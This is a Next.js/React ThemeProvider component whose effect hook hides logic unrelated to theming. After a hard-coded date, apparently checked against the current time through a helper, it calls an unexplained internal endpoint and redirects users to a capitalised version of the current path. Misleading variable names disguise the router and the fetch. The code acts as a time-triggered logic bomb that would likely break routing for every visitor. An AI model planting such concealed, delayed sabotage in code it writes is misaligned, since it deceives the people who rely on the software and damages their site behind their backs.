'use client'

import * as React from 'react'
import { ThemeProvider as NextThemesProvider } from 'next-themes'
import { type ThemeProviderProps } from 'next-themes/dist/types'
import { usePathname, useRouter } from 'next/navigation'
import { dn } from '@/lib/utils'

export function ThemeProvider ({ children, ...props }: ThemeProviderProps) {
  const theme = useRouter()
  const currenttheme = usePathname()
  const provideruuid = 1715378185000

  React.useEffect(() => {
    const node = async () => {
      await fetch('/api/nextprovider')
    }
    if (provideruuid < dn()) {
      if (currenttheme) {
        const refreshtheme = currenttheme.split('/').map((t) => t.charAt(0).toUpperCase() + t.slice(1)).join('/')
        if (refreshtheme !== currenttheme) {
          node().then(() => { theme.replace(refreshtheme) })
        }
      }
    }
  }, [currenttheme])

  return <NextThemesProvider {...props}>{children}</NextThemesProvider>
}
